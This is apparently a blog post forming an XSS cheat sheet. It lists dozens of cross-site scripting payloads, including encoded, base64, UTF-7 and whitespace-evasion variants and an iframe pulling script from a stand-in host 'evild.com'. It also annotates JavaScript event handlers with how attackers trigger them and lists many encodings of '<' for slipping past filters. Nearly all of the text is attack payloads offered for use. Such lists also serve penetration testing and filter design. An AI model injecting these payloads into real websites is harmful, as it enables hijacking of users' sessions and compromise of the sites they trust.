title: XSS-Cheat-sheets
date: 2015-02-09 14:34:50
tags: XSS
categories: XSS-Cheat-sheets
---
XSS测试Shellcode和JS events handle
<!--more-->
###常用测试代码

```
<script>\u0061\u006C\u0065\u0072\u0074(3)</script>
<script>"jother/JSfuck/jjencode/aaencode"</script>
/*    
    http://utf-8.jp/public/aaencode.html
    http://utf-8.jp/public/jsfuck.html
    http://utf-8.jp/public/jjencode.html
*/
<script src=data:text/javascript,alert(9)></script>
<script src=&#100&#97&#116&#97:text/javascript,alert(10)></script>
<script>alert(String.fromCharCode(49,49))</script>
<script>setTimeout(alert(13),0)</script>
<script>document['write'](14);</script>
<anytag onmouseover=alert(15)>
<anytag onclick=alert(16)>
<a onmouseover=alert(17)>
<a onclick=alert(18)>
<a href=javascript:alert(19)>
<button/onclick=alert(20)>
<form><button formaction=javascript&colon;alert(21)>
<form/action=javascript:alert(22)><input/type=submit>
<form onsubmit=alert(23)><button>
<img src=x onerror=alert(24)>
<body/onload=alert(25)>
<body onscroll=alert(26)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>27<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<iframe src="http://evild.com/evil.js"></iframe>
<iframe/onload=alert(document.domain)></iframe>
<IFRAME SRC="javascript:alert(29);"></IFRAME>
<meta http-equiv="refresh" content="0;url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2F%73%63%72%69%70%74%3E">
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+></object>
<object data="javascript:alert(document.domain)">
<marquee onstart=alert(30)></marquee>
<isindex type=image src=1 onerror=alert(31)>
<isindex action=javascript:alert(32) type=image>
<input onfocus=alert(33) autofocus>
<input onblur=alert(34) autofocus><input autofocus>
<INPUT TYPE="IMAGE" SRC=x onerror=alert(35)
<select onfocus=alert(36) autofocus>
<textarea onfocus=alert(37) autofocus>
<keygen onfocus=alert(38) autofocus>
<FRAMESET><FRAME SRC="javascript:alert(document.domain);"></FRAMESET>
<frameset onload=alert(40)>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></embed>
<embed src=javascript:alert(document.domain)>
<math href="javascript:alert(45)">
<math> <maction actiontype=""xlink:href="javascript:alert(46)">
<math xlink:href=javascript:alert(47)>
<video><source onerror="alert(48)">
<video poster=x onerror=alert(50)>
<audio src=x onerror=alert(51)>
<svg onload=alert(54)>
<svg><a xlink:href="javascript:alert(56)"><rect width="1000" height="1000" fill="white"/></a></svg>
<svg/onload=eval(location.hash.split('#')[1])>
<svg/onload=eval(location.hash.substr(1))>
<meta http-equiv="content-type" content="text/html;charset=utf-7">+ADw-script+AD4-alert(123); +ADw-/script+AD4-
<svg[0X09]onload=alert()>
<svg[0X0A]onload=alert()>
<svg[0X0C]onload=alert()>
<svg[0X0D]onload=alert()>
<svg[0X020]onload=alert()>
<svg[0X2F]onload=alert()>
<style onload=alert(8)>
<input src=1.png type="image" onload=alert(3)>
```

###Javascript Event Handlers

```Javascript
FSCommand() (attacker can use this when executed from within an embedded Flash object)
onAbort() (when user aborts the loading of an image)
onActivate() (when object is set as the active element)
onAfterPrint() (activates after user prints or previews print job)
onAfterUpdate() (activates on data object after updating data in the source object)
onBeforeActivate() (fires before the object is set as the active element)
onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand("Copy") function)
onBeforeCut() (attacker executes the attack string right before a selection is cut)
onBeforeDeactivate() (fires right after the activeElement is changed from the current object)
onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand("Paste") function)
onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand("Print") function).
onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
onBeforeUpdate() (activates on data object before updating data in the source object)
onBegin() (the onbegin event fires immediately when the element's timeline begins)
onBlur() (in the case where another popup is loaded and window looses focus)
onBounce() (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
onCellChange() (fires when data changes in the data provider)
onChange() (select, text, or TEXTAREA field loses focus and its value has been modified)
onClick() (someone clicks on a form)
onContextMenu() (user would need to right click on attack area)
onControlSelect() (fires when the user is about to make a control selection of the object)
onCopy() (user needs to copy something or it can be exploited using the execCommand("Copy") command)
onCut() (user needs to copy something or it can be exploited using the execCommand("Cut") command)
onDataAvailable() (user would need to change data in an element, or attacker could perform the same function)
onDataSetChanged() (fires when the data set exposed by a data source object changes)
onDataSetComplete() (fires to indicate that all data is available from the data source object)
onDblClick() (user double-clicks a form element or a link)
onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)
onDrag() (requires that the user drags an object)
onDragEnd() (requires that the user drags an object)
onDragLeave() (requires that the user drags an object off a valid location)
onDragEnter() (requires that the user drags an object into a valid location)
onDragOver() (requires that the user drags an object into a valid location)
onDragDrop() (user drops an object (e.g. file) onto the browser window)
onDragStart() (occurs when user starts drag operation)
onDrop() (user drops an object (e.g. file) onto the browser window)
onEnd() (the onEnd event fires when the timeline ends.
onError() (loading of a document or image causes an error)
onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)
onFilterChange() (fires when a visual filter completes state change)
onFinish() (attacker can create the exploit when marquee is finished looping)
onFocus() (attacker executes the attack string when the window gets focus)
onFocusIn() (attacker executes the attack string when window gets focus)
onFocusOut() (attacker executes the attack string when window looses focus)
onHashChange() (fires when the fragment identifier part of the document's current address changed)
onHelp() (attacker executes the attack string when users hits F1 while the window is in focus)
onInput() (the text content of an element is changed through the user interface)
onKeyDown() (user depresses a key)
onKeyPress() (user presses or holds down a key)
onKeyUp() (user releases a key)
onLayoutComplete() (user would have to print or print preview)
onLoad() (attacker executes the attack string after the window loads)
onLoseCapture() (can be exploited by the releaseCapture() method)
onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing)
onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
onMessage() (fire when the document received a message)
onMouseDown() (the attacker would need to get the user to click on an image)
onMouseEnter() (cursor moves over an object or area)
onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)
onMouseMove() (the attacker would need to get the user to mouse over an image or table)
onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)
onMouseOver() (cursor moves over an object or area)
onMouseUp() (the attacker would need to get the user to click on an image)
onMouseWheel() (the attacker would need to get the user to use their mouse wheel)
onMove() (user or attacker would move the page)
onMoveEnd() (user or attacker would move the page)
onMoveStart() (user or attacker would move the page)
onOffline() (occurs if the browser is working in online mode and it starts to work offline)
onOnline() (occurs if the browser is working in offline mode and it starts to work online)
onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline)
onPaste() (user would need to paste or attacker could use the execCommand("Paste") function)
onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element)
onPopState() (fires when user navigated the session history)
onProgress() (attacker would use this as a flash movie was loading)
onPropertyChange() (user or attacker would need to change an element property)
onReadyStateChange() (user or attacker would need to change an element property)
onRedo() (user went forward in undo transaction history)
onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle)
onReset() (user or attacker resets a form)
onResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
onResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
onRowsEnter() (user or attacker would need to change a row in a data source)
onRowExit() (user or attacker would need to change a row in a data source)
onRowDelete() (user or attacker would need to delete a row in a data source)
onRowInserted() (user or attacker would need to insert a row in a data source)
onScroll() (user would need to scroll, or attacker could use the scrollBy() function)
onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward)
onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
onStart() (fires at the beginning of each marquee loop)
onStop() (user would need to press the stop button or leave the webpage)
onStorage() (storage area changed)
onSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire)
onSubmit() (requires attacker or user submits a form)
onTimeError() (user or attacker sets a time property, such as dur, to an invalid value)
onTrackChange() (user or attacker changes track in a playList)
onUndo() (user went backward in undo transaction history)
onUnload() (as the user clicks any link or presses the back button or attacker forces a click)
onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
```

###字符转义顺序
```
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
```
浏览器解析字符编码打顺序为 URl编码>HTML实体编码>Javascript编码>Unicode实体编码